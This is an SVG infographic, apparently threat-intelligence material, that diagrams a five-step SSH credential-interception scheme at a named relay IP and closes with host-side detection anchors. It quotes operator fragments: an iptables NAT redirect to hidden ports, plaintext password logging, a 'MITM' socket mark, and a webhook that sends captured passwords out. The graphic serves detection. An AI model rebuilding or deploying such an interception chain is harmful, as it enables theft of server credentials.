<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 1700" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif">
  <!--
    Parasitic capture sequence — SSH interception platform, 157.180.101.47
    Layout family: vertical-chain, 5 cards.
    Colour bands: orange = access, red = operator code, yellow = upstream validation,
                  deep red = endgame (exfil + outcome).
  -->
  <defs>
    <marker id="arrow" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto">
      <path d="M 0 0 L 10 5 L 0 10 z" fill="#cccccc"/>
    </marker>
    <filter id="cardShadow" x="-2%" y="-2%" width="104%" height="108%">
      <feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#000" flood-opacity="0.55"/>
    </filter>
  </defs>

  <rect width="1000" height="1700" fill="#161616"/>
  <rect x="0.5" y="0.5" width="999" height="1699" fill="none" stroke="#2a2a2a" stroke-width="1"/>

  <!-- =========== TITLE =========== -->
  <text x="500" y="62" text-anchor="middle" font-size="40" font-weight="700" fill="#ffffff">The Parasitic Capture Sequence</text>
  <text x="500" y="106" text-anchor="middle" font-size="24" fill="#f5f5f5">Success is declared only after the real server has already said yes</text>
  <text x="500" y="140" text-anchor="middle" font-size="18" fill="#cccccc">The attacker whose brute force found the credential sees nothing out of the ordinary</text>
  <line x1="60" y1="166" x2="940" y2="166" stroke="#2a2a2a" stroke-width="1"/>

  <!-- =========== STEP 1 — ORANGE: access =========== -->
  <g filter="url(#cardShadow)">
    <rect x="60" y="196" width="880" height="220" rx="8" fill="#1a1a1a" stroke="#2a2a2a" stroke-width="1"/>
    <rect x="60" y="196" width="880" height="46" rx="8" fill="#f97316"/>
    <rect x="60" y="229" width="880" height="13" fill="#f97316"/>
    <text x="80" y="227" font-size="17" font-weight="700" fill="#111111" letter-spacing="0.5">STEP 1</text>
    <text x="200" y="227" font-size="23" font-weight="600" fill="#111111">Redirected in, invisibly</text>
    <text x="80" y="282" font-size="21" fill="#ffffff">A third party's brute-force SSH crosses a relay the operator controls.</text>
    <text x="80" y="316" font-size="17" fill="#e5e5e5" font-family="ui-monospace, 'Cascadia Mono', Menlo, monospace">iptables -t nat REDIRECT  ·  interceptor listening on 19922 / 19923</text>
    <text x="80" y="350" font-size="18" fill="#e5e5e5">An INPUT DROP hides the listener, so a port scan of the relay sees nothing.</text>
    <text x="80" y="384" font-size="18" fill="#fb923c" font-weight="600">Hunt host-side or traffic-side. Never by scanning.</text>
  </g>
  <line x1="500" y1="416" x2="500" y2="456" stroke="#cccccc" stroke-width="2" marker-end="url(#arrow)"/>

  <!-- =========== STEP 2 — RED: operator code =========== -->
  <g filter="url(#cardShadow)">
    <rect x="60" y="462" width="880" height="220" rx="8" fill="#1a1a1a" stroke="#2a2a2a" stroke-width="1"/>
    <rect x="60" y="462" width="880" height="46" rx="8" fill="#dc2626"/>
    <rect x="60" y="495" width="880" height="13" fill="#dc2626"/>
    <text x="80" y="493" font-size="17" font-weight="700" fill="#ffffff" letter-spacing="0.5">STEP 2</text>
    <text x="200" y="493" font-size="23" font-weight="600" fill="#ffffff">Logged in plaintext, before any decision</text>
    <text x="80" y="548" font-size="21" fill="#ffffff">The password is written to the log before anything is validated.</text>
    <text x="80" y="582" font-size="17" fill="#e5e5e5" font-family="ui-monospace, 'Cascadia Mono', Menlo, monospace">log.info(f"AUTH_TRY user={username} password={password!r}")</text>
    <text x="80" y="616" font-size="18" fill="#e5e5e5">A 32,735-entry blocklist refuses cheap passwords before any upstream cost.</text>
    <text x="80" y="650" font-size="18" fill="#fb923c" font-weight="600">Only credentials worth stealing reach the next step.</text>
  </g>
  <line x1="500" y1="682" x2="500" y2="722" stroke="#cccccc" stroke-width="2" marker-end="url(#arrow)"/>

  <!-- =========== STEP 3 — YELLOW: upstream validation =========== -->
  <g filter="url(#cardShadow)">
    <rect x="60" y="728" width="880" height="220" rx="8" fill="#1a1a1a" stroke="#2a2a2a" stroke-width="1"/>
    <rect x="60" y="728" width="880" height="46" rx="8" fill="#eab308"/>
    <rect x="60" y="761" width="880" height="13" fill="#eab308"/>
    <text x="80" y="759" font-size="17" font-weight="700" fill="#111111" letter-spacing="0.5">STEP 3</text>
    <text x="200" y="759" font-size="23" font-weight="600" fill="#111111">Validated against the real target first</text>
    <text x="80" y="814" font-size="21" fill="#ffffff">The interceptor opens its own connection using those exact credentials.</text>
    <text x="80" y="848" font-size="17" fill="#e5e5e5" font-family="ui-monospace, 'Cascadia Mono', Menlo, monospace">sock.setsockopt(SOL_SOCKET, SO_MARK, 0x4D49544D)   # ASCII "MITM"</text>
    <text x="80" y="882" font-size="18" fill="#e5e5e5">The mark exempts its own traffic from the redirect it just created.</text>
    <text x="80" y="916" font-size="18" fill="#fb923c" font-weight="600">0x4D49544D has no legitimate use. The strongest indicator here.</text>
  </g>
  <line x1="500" y1="948" x2="500" y2="988" stroke="#cccccc" stroke-width="2" marker-end="url(#arrow)"/>

  <!-- =========== STEP 4 — DEEP RED: the theft =========== -->
  <g filter="url(#cardShadow)">
    <rect x="60" y="994" width="880" height="220" rx="8" fill="#1a1a1a" stroke="#2a2a2a" stroke-width="1"/>
    <rect x="60" y="994" width="880" height="46" rx="8" fill="#7f1d1d"/>
    <rect x="60" y="1027" width="880" height="13" fill="#7f1d1d"/>
    <text x="80" y="1025" font-size="17" font-weight="700" fill="#ffffff" letter-spacing="0.5">STEP 4</text>
    <text x="200" y="1025" font-size="23" font-weight="600" fill="#ffffff">The verdict is mirrored, the credential is kept</text>
    <text x="80" y="1080" font-size="21" fill="#ffffff">Accepted upstream, so the client is told yes and handed a live session.</text>
    <text x="80" y="1114" font-size="17" fill="#e5e5e5" font-family="ui-monospace, 'Cascadia Mono', Menlo, monospace">webhook({'event':'auth_success', ..., 'password': password})</text>
    <text x="80" y="1148" font-size="18" fill="#fb923c" font-weight="600">Refused upstream, and the client is told no. Exactly what it would have seen.</text>
    <text x="80" y="1182" font-size="18" fill="#fb923c" font-weight="600">Either way the plaintext is already on its way to the receiver.</text>
  </g>
  <line x1="500" y1="1214" x2="500" y2="1254" stroke="#cccccc" stroke-width="2" marker-end="url(#arrow)"/>

  <!-- =========== STEP 5 — DEEP RED: outcome =========== -->
  <g filter="url(#cardShadow)">
    <rect x="60" y="1260" width="880" height="220" rx="8" fill="#1a1a1a" stroke="#2a2a2a" stroke-width="1"/>
    <rect x="60" y="1260" width="880" height="46" rx="8" fill="#7f1d1d"/>
    <rect x="60" y="1293" width="880" height="13" fill="#7f1d1d"/>
    <text x="80" y="1291" font-size="17" font-weight="700" fill="#ffffff" letter-spacing="0.5">STEP 5</text>
    <text x="200" y="1291" font-size="23" font-weight="600" fill="#ffffff">Somebody else did the work</text>
    <text x="80" y="1346" font-size="21" fill="#ffffff">The attacker gets the result it would have got without the interceptor.</text>
    <text x="80" y="1380" font-size="17" fill="#e5e5e5" font-family="ui-monospace, 'Cascadia Mono', Menlo, monospace">no timing tell  ·  no extra failure  ·  no extra success</text>
    <text x="80" y="1414" font-size="18" fill="#e5e5e5">The operator holds a credential verified the instant it proved itself,</text>
    <text x="80" y="1448" font-size="18" fill="#fb923c" font-weight="600">against a machine that has nothing to do with either of them.</text>
  </g>

  <!-- =========== FOOTER =========== -->
  <line x1="60" y1="1526" x2="940" y2="1526" stroke="#2a2a2a" stroke-width="1"/>
  <text x="500" y="1560" text-anchor="middle" font-size="18" font-weight="600" fill="#ffffff">Detection anchors:  SO_MARK 0x4D49544D  ·  ipset mitm_exclude</text>
  <text x="500" y="1590" text-anchor="middle" font-size="18" font-weight="600" fill="#ffffff">nat REDIRECT to 19922 / 19923  ·  paramiko banner on port 22</text>
  <text x="500" y="1626" text-anchor="middle" font-size="15" fill="#cccccc">Relays are externally invisible by design, so detection must be host-side or traffic-side.</text>
  <text x="500" y="1658" text-anchor="middle" font-size="14" fill="#888888">Legend: orange = access · red = operator code · yellow = upstream validation · deep red = endgame</text>
</svg>
